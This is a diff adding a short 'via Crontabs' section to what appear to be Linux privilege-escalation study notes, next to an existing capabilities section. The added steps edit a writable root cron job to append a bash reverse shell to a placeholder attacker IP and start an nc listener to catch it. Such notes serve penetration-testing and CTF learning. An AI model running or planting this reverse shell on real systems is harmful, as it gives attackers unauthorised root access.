@@ -12,3 +12,11 @@ via Capabilities
 
 1. getcap -r / 2>dev/null (will produce a lot of errors so let's redirect it to dev/null)
 2. ls -l to list permissions of the capabilities
+
+via Crontabs
+
+1. /etc/crontab and check the list of jobs run by root (or account with higher privilege)
+2. check if the job is editable using nano <job_path>
+3. add a reverse shell script command to the current job: bash -i >& /dev/tcp/<attacker's IP>/<port_number> 0>&1
+4. Start the listener on the attacker's IP nc -nlvp <port_number> 
+5. When the cronjob is executable, it will spin up a reverse shell with the account that runs the cronjob
